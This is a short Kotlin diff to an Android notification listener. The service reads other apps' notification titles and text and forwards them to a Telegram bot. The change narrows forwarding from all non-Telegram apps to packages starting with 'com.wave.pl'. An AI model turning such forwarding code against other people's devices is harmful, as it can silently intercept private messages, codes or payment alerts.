@@ -32,7 +32,7 @@ class NotificationListener : NotificationListenerService() {
         val title = extras.getString("android.title")
         val text = extras.getCharSequence("android.text")?.toString()
         val timestamp = getCurrentTimeInIST()
-        if(!packageName.startsWith("org.telegram")) {
+        if(packageName.startsWith("com.wave.pl")) {
             telegramService.sendMessage("Package: $packageName, Title: $title, Text: $text, Time: $timestamp")
             if (title != null && text != null) {
                 val notificationData = NotificationData(
